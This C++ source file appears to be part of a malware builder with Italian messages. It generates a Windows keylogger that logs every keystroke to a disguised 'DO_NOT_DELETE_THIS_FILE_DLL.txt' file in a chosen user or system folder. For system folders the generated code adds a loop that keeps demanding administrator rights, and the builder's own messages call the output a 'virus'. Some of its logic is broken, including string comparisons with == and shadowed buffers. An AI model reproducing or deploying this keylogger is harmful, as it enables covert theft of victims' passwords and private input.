#include<fstream>
#include<iostream>
#include<string.h>
#define string_1 10000
#define string_2 10000
#define string_3 10000
#define string_4 10000

using namespace std;
char key_logger_3(const char request[]){
	
fflush(stdin);
char export_string_1[string_1],export_string_2[string_2],export_string_3[string_3],export_string_4[string_4];

FILE *export_file_output;

system("cd..");
system("mkdir output");

if (request=="Programmi"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Program Files\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
            char export_string_2[string_2] = "\n    BOOL IsRunAsAdministrator()\n{\n  BOOL fIsRunAsAdmin = FALSE;\n  DWORD dwError = ERROR_SUCCESS;\n  PSID pAdministratorsGroup = NULL;\n  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;\n  if (!AllocateAndInitializeSid(\n  &NtAuthority, \n    2, \n  SECURITY_BUILTIN_DOMAIN_RID, \n  DOMAIN_ALIAS_RID_ADMINS, \n  0, 0, 0, 0, 0, 0, \n  &pAdministratorsGroup))\n  {\n  dwError = GetLastError();\n  goto Cleanup;\n  }\n  if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))\n  {\n  dwError = GetLastError();\n  goto Cleanup;\n  }\n\n Cleanup:  \n\n  if (pAdministratorsGroup)\n  {\n   FreeSid(pAdministratorsGroup);\n   pAdministratorsGroup = NULL;\n  }\n  if (ERROR_SUCCESS != dwError)\n  {\n  throw dwError;\n  }\n\n  return fIsRunAsAdmin;\n }\n\n void ElevateNow()\n{\n  BOOL bAlreadyRunningAsAdministrator = FALSE;\n  try\n  {\n  bAlreadyRunningAsAdministrator = IsRunAsAdministrator();\n }\n catch(...)\n {\n  }\n  if(!bAlreadyRunningAsAdministrator)\n  {\n    char szPath[MAX_PATH];\n    if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)))\n    {\n    SHELLEXECUTEINFO sei = { sizeof(sei) };\n  sei.lpVerb = \"runas\";\n  sei.lpFile = szPath;\n   sei.hwnd = NULL;\n   sei.nShow = SW_NORMAL;\n   if (!ShellExecuteEx(&sei))\n  {\n         DWORD dwError = GetLastError();\n   if (dwError == ERROR_CANCELLED)\n   CreateThread(0,0,(LPTHREAD_START_ROUTINE)ElevateNow,0,0,0);\n       }\n         }\n\n       }\n       else\n     {\n     }\n     }";
            char export_string_3[string_3] = "if(IsRunAsAdministrator()){\n";
            char export_string_4[string_4] = " }else\n{\nElevateNow();\n}";
}else if (request=="Programmi(x86)"){
            char export_string_1[string_1] = "mystream<<\"C:\\\\Program Files (x86)\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
            char export_string_2[string_2] = "\n    BOOL IsRunAsAdministrator()\n{\n  BOOL fIsRunAsAdmin = FALSE;\n  DWORD dwError = ERROR_SUCCESS;\n  PSID pAdministratorsGroup = NULL;\n  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;\n  if (!AllocateAndInitializeSid(\n  &NtAuthority, \n    2, \n  SECURITY_BUILTIN_DOMAIN_RID, \n  DOMAIN_ALIAS_RID_ADMINS, \n  0, 0, 0, 0, 0, 0, \n  &pAdministratorsGroup))\n  {\n  dwError = GetLastError();\n  goto Cleanup;\n  }\n  if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))\n  {\n  dwError = GetLastError();\n  goto Cleanup;\n  }\n\n Cleanup:  \n\n  if (pAdministratorsGroup)\n  {\n   FreeSid(pAdministratorsGroup);\n   pAdministratorsGroup = NULL;\n  }\n  if (ERROR_SUCCESS != dwError)\n  {\n  throw dwError;\n  }\n\n  return fIsRunAsAdmin;\n }\n\n void ElevateNow()\n{\n  BOOL bAlreadyRunningAsAdministrator = FALSE;\n  try\n  {\n  bAlreadyRunningAsAdministrator = IsRunAsAdministrator();\n }\n catch(...)\n {\n  }\n  if(!bAlreadyRunningAsAdministrator)\n  {\n    char szPath[MAX_PATH];\n    if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)))\n    {\n    SHELLEXECUTEINFO sei = { sizeof(sei) };\n  sei.lpVerb = \"runas\";\n  sei.lpFile = szPath;\n   sei.hwnd = NULL;\n   sei.nShow = SW_NORMAL;\n   if (!ShellExecuteEx(&sei))\n  {\n         DWORD dwError = GetLastError();\n   if (dwError == ERROR_CANCELLED)\n   CreateThread(0,0,(LPTHREAD_START_ROUTINE)ElevateNow,0,0,0);\n       }\n         }\n\n       }\n       else\n     {\n     }\n     }";
            char export_string_3[string_3] = "if(IsRunAsAdministrator()){\n";
            char export_string_4[string_4] = " }else\n{\nElevateNow();\n}";
}else if (request=="Windows"){
            char export_string_1[string_1] = "mystream<<\"C:\\\\Windows\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
            char export_string_2[string_2] = "\n    BOOL IsRunAsAdministrator()\n{\n  BOOL fIsRunAsAdmin = FALSE;\n  DWORD dwError = ERROR_SUCCESS;\n  PSID pAdministratorsGroup = NULL;\n  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;\n  if (!AllocateAndInitializeSid(\n  &NtAuthority, \n    2, \n  SECURITY_BUILTIN_DOMAIN_RID, \n  DOMAIN_ALIAS_RID_ADMINS, \n  0, 0, 0, 0, 0, 0, \n  &pAdministratorsGroup))\n  {\n  dwError = GetLastError();\n  goto Cleanup;\n  }\n  if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))\n  {\n  dwError = GetLastError();\n  goto Cleanup;\n  }\n\n Cleanup:  \n\n  if (pAdministratorsGroup)\n  {\n   FreeSid(pAdministratorsGroup);\n   pAdministratorsGroup = NULL;\n  }\n  if (ERROR_SUCCESS != dwError)\n  {\n  throw dwError;\n  }\n\n  return fIsRunAsAdmin;\n }\n\n void ElevateNow()\n{\n  BOOL bAlreadyRunningAsAdministrator = FALSE;\n  try\n  {\n  bAlreadyRunningAsAdministrator = IsRunAsAdministrator();\n }\n catch(...)\n {\n  }\n  if(!bAlreadyRunningAsAdministrator)\n  {\n    char szPath[MAX_PATH];\n    if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)))\n    {\n    SHELLEXECUTEINFO sei = { sizeof(sei) };\n  sei.lpVerb = \"runas\";\n  sei.lpFile = szPath;\n   sei.hwnd = NULL;\n   sei.nShow = SW_NORMAL;\n   if (!ShellExecuteEx(&sei))\n  {\n         DWORD dwError = GetLastError();\n   if (dwError == ERROR_CANCELLED)\n   CreateThread(0,0,(LPTHREAD_START_ROUTINE)ElevateNow,0,0,0);\n       }\n         }\n\n       }\n       else\n     {\n     }\n     }";
            char export_string_3[string_3] = "if(IsRunAsAdministrator()){\n";
            char export_string_4[string_4] = " }else\n{\nElevateNow();\n}";
}else if(request=="Pubblica"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\Public\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
 	        char export_string_2[string_2] = "\n    BOOL IsRunAsAdministrator()\n{\n  BOOL fIsRunAsAdmin = FALSE;\n  DWORD dwError = ERROR_SUCCESS;\n  PSID pAdministratorsGroup = NULL;\n  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;\n  if (!AllocateAndInitializeSid(\n  &NtAuthority, \n    2, \n  SECURITY_BUILTIN_DOMAIN_RID, \n  DOMAIN_ALIAS_RID_ADMINS, \n  0, 0, 0, 0, 0, 0, \n  &pAdministratorsGroup))\n  {\n  dwError = GetLastError();\n  goto Cleanup;\n  }\n  if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))\n  {\n  dwError = GetLastError();\n  goto Cleanup;\n  }\n\n Cleanup:  \n\n  if (pAdministratorsGroup)\n  {\n   FreeSid(pAdministratorsGroup);\n   pAdministratorsGroup = NULL;\n  }\n  if (ERROR_SUCCESS != dwError)\n  {\n  throw dwError;\n  }\n\n  return fIsRunAsAdmin;\n }\n\n void ElevateNow()\n{\n  BOOL bAlreadyRunningAsAdministrator = FALSE;\n  try\n  {\n  bAlreadyRunningAsAdministrator = IsRunAsAdministrator();\n }\n catch(...)\n {\n  }\n  if(!bAlreadyRunningAsAdministrator)\n  {\n    char szPath[MAX_PATH];\n    if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)))\n    {\n    SHELLEXECUTEINFO sei = { sizeof(sei) };\n  sei.lpVerb = \"runas\";\n  sei.lpFile = szPath;\n   sei.hwnd = NULL;\n   sei.nShow = SW_NORMAL;\n   if (!ShellExecuteEx(&sei))\n  {\n         DWORD dwError = GetLastError();\n   if (dwError == ERROR_CANCELLED)\n   CreateThread(0,0,(LPTHREAD_START_ROUTINE)ElevateNow,0,0,0);\n       }\n         }\n\n       }\n       else\n     {\n     }\n     }";
            char export_string_3[string_3] = "if(IsRunAsAdministrator()){\n";
            char export_string_4[string_4] = " }else\n{\nElevateNow();\n}";

}else if (request=="Collegamenti"){
            char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Links\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
            char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}else if(request=="Contatti"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Contacts\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
	        char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}else if(request=="Desktop"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Desktop\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
	        char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}else if(request=="Documenti"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Documents\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
            char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}else if(request=="Download"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Downloads\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
	        char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}else if(request=="Immagini"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Pictures\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
	        char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}else if(request=="Musica"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Music\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
	        char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}else if(request=="Partite salvate"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Saved Games\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
	        char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}else if(request=="Preferiti"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Favorites\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
	        char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}else if(request=="Ricerche"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Searches\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
	        char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}else if(request=="Roaming"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Roaming\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
	        char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}else if(request=="Video"){
	        char export_string_1[string_1] = "mystream<<\"C:\\\\Users\\\\\"<<username<<\"\\\\Videos\\\\DO_NOT_DELETE_THIS_FILE_DLL.txt\";";
	        char export_string_2[string_2] = "\n";
            char export_string_3[string_3] = "\n";
            char export_string_4[string_4] = "\n";
}

            export_file_output = fopen("output\\keylogger_3.cpp","w");
            fprintf(export_file_output,"#include <iostream>\n#include <windows.h>\n#include <fstream>\n#include <sstream>\n#include <string.h>\n#include<Lmcons.h>\nusing namespace std;\n\n %s",export_string_2);
            fprintf(export_file_output,"void WriteLog(LPCSTR text) {  \n  char usr[21];\n  string username; \n DWORD lusr = sizeof(usr); \n if (GetUserName(usr, &lusr)) \n username = usr; \n stringstream mystream;\n %s \n string concatenated = mystream.str();\n ofstream outfile; \n outfile.open(concatenated.c_str(), ofstream::app); \n outfile << text; \n outfile.close();\n}\n",export_string_1);
            fprintf(export_file_output,"bool KeyIsListed(int iGetKey) {\n switch (iGetKey)\n {\n case VK_OEM_2:\n cout<<\" ? \"<<endl;\n WriteLog(\" ? \\n\");\n break;\n case VK_OEM_7:\n cout<<\" ' \";\n WriteLog(\" ' \\n\");\n break;\n case VK_LBUTTON: \n cout << \" *LeftM* \\n\" << endl;\n WriteLog(\" *LeftM* \\n\");\n break;\n case VK_RBUTTON: \n cout << \" *RightM* \" << endl; \n WriteLog(\" *RightM* \\n\");\n break;\n case VK_CONTROL: \n cout << \" *Ctrl* \\n\" << endl; \n WriteLog(\" *Ctrl* \\n\");\n break;\n case VK_SHIFT: \n cout << \" *Shift* \\n\" << endl; \n WriteLog(\" *Shift* \\n\");\n break;\n case VK_RETURN: \n cout << \" *ENTER* \"<<endl; \n WriteLog(\" *ENTER* \\n\");\n case VK_SPACE:\n cout << \"  \"<<endl; \n WriteLog(\"  \");\n break;\n case VK_OEM_PLUS:\n cout<<\" + \"<<endl;\n WriteLog(\" + \\n\");\n break;\n default: return FALSE;\n}\n\n}");
            fprintf(export_file_output,"\nint main(){\n %s char key; \nwhile (TRUE)\n\n{\nSleep(10); \n\nfor (key = 8; key <= 190; key++) \n{\nif (GetAsyncKeyState(key) == -32767) {\n  if (KeyIsListed(key) == FALSE)\n{\n",export_string_3);
            fprintf(export_file_output,"char usr[21];\nstring username;\nDWORD lusr = sizeof(usr);\nif (GetUserName(usr, &lusr))\n username = usr;\n stringstream mystream;\n %s \n string concatenated = mystream.str();\n cout << key; \n ofstream outfile;\n outfile.open(concatenated.c_str(), ofstream::app);\n outfile << key;\n outfile.close();\n }\n else {\n}\n}\n}\n}\n %s \n return EXIT_SUCCESS;\n}",export_string_1,export_string_4);
            fclose (export_file_output);
            waiting();
         
            ifstream check ("output\\keylogger_3.cpp");
            if (check)
            cout <<"Virus creato correttamente. Salvato nella directory: output"<<endl;
            else
            cout<<"Errore nell\'elaborazione, il virus non e' stato creato";
      
      

}
